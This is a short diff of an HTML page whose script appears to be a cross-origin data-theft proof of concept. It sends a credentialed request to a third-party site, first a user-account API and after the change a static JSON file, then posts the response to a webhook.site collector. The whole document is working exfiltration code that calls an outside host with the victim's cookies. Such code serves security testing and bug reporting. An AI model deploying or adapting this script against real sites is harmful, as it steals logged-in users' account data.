@@ -3,11 +3,11 @@
 <body>
 <script>
     var req = new XMLHttpRequest();
-    req.open('GET', 'https://core.basalam.com/api_v2/user', true);
+    req.open('GET', 'https://van.najva.com/static/js/scripts/new-website45760-website-43533-e5b797cf-084a-497a-aef8-e425bc6a773f.json?v=2025-02-07T13', true);
     req.withCredentials = true;
     req.onload = function() {
         var logReq = new XMLHttpRequest();
-        logReq.open('POST', 'https://webhook.site/1512def5-c717-41c1-acf1-baf3a8864967', true);
+        logReq.open('POST', 'https://webhook.site/f07a5339-f127-4f62-8b5d-8193eb6623aa', true);
         logReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
         logReq.send('key=' + encodeURIComponent(req.responseText));
     };
